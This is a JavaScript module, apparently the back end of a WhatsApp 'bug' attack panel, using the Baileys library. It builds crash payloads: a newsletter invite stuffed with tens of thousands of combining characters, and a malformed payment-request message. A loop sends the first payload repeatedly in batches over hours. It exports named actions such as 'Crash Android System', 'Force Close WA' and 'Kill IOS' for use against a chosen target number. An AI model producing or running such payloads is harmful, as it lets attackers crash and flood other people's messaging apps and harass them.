const {
    generateWAMessageFromContent,
    generateMessageID
} = require("@whiskeysockets/baileys");
const chalk = require('chalk');

// Utility Functions
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ==================== CORE BUG FUNCTIONS ==================== //

async function N3xithBlank(sock, X) {
    const msg = {
        newsletterAdminInviteMessage: {
            newsletterJid: "120363321780343299@newsletter",
            newsletterName: "꙳͙͡༑ᐧ𝐒̬𝖎፝͢𝑿 ⍣᳟ 𝐍ͮ𝟑͜𝐮̽𝐕𝐞𝐫̬⃜꙳𝐗ͮ𝐨͢͡𝐗༑〽️" + "ោ៝".repeat(10000),
            caption: "𝐍𝟑𝐱̈𝒊𝐭𝐡 Cʟᴀsˢˢˢ #🇧🇳 ( 𝟑𝟑𝟑 )" + "꧀".repeat(10000),
            inviteExpiration: "999999999"
        }
    };

    try {
        await sock.relayMessage(X, msg, {
            participant: { jid: X },
            messageId: sock.generateMessageTag?.() || generateMessageID()
        });
    } catch (error) {
        console.error(`❌ Gagal mengirim bug ke ${X}:`, error.message);
    }
}

async function PaymentNoButton(sock, target) {
    const msg = await generateWAMessageFromContent(
        target,
        {
            interactiveMessage: {
                message: {
                    requestPaymentMessage: {
                        currencyCodeIso4217: "IDR",
                        amount1000: 25000 * 1000,
                        requestFrom: target,
                        noteMessage: {
                            extendedTextMessage: {
                                text: "Pembayaran layanan Oleh - AiiSigma"
                            }
                        },
                        expiryTimestamp: Math.floor(Date.now() / 1000) + 86400,
                    }
                }
            }
        },
        {}
    );

    await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id
    });
}

// INI BUAT BUTTON DELAY 50%
async function delaylow(sock, durationHours, X) {
    if (!sock) {
        console.error('❌ Socket tidak tersedia untuk delaylow');
        return;
    }

    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0;
    let batch = 1;
    const maxBatches = 5;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
            return;
        }

        try {
            if (count < 30) {
                await Promise.all([
                    N3xithBlank(sock, X),
                    sleep(500)
                ]);

                console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/30 delaylow 📟
└────────────────────────┘
  `));
                count++;
                setTimeout(sendNext, 700);
            } else {
                console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
                if (batch < maxBatches) {
                    console.log(chalk.yellow(`( 🍷 Indictive | Core V6 ).`));
                    count = 0;
                    batch++;
                    setTimeout(sendNext, 300000);
                } else {
                    console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
                }
            }
        } catch (error) {
            console.error(`✗ Error saat mengirim: ${error.message}`);
            setTimeout(sendNext, 700);
        }
    };
    sendNext();
}

// ==================== EXPORTED ACTIONS ==================== //

// Tentukan tindakan di sini. Anda dapat mengganti nama kunci (misalnya 'crashAndroid') sesuai keinginan Anda.
// Namun, pastikan formulir HTML Anda mengirimkan 'mode' yang sesuai.

const actions = {
    crashAndroid: {
        name: "Crash Android System",
        description: "Crash target Android WA",
        icon: "fa-brands fa-android",
        execute: async (sock, target) => {
            for (let i = 0; i < 1; i++) {
                await PaymentNoButton(sock, target);
            }
            console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
        }
    },
    invisDelay: {
        name: "Invisible Delay",
        description: "Causes invisible delay",
        icon: "fa-solid fa-clock",
        execute: async (sock, target) => {
            await delaylow(sock, 24, target);
        }
    },
    forceClose: {
        name: "Force Close WA",
        description: "Force close the app",
        icon: "fa-solid fa-skull",
        execute: async (sock, target) => {
            for (let i = 0; i < 1; i++) {
                await PaymentNoButton(sock, target);
            }
            console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
        }
    },
    killIos: {
        name: "Kill IOS",
        description: "Crash iOS WA",
        icon: "fa-brands fa-apple",
        execute: async (sock, target) => {
            for (let i = 0; i < 1; i++) {
                await PaymentNoButton(sock, target);
            }
            console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
        }
    }
};

module.exports = {
    actions
};
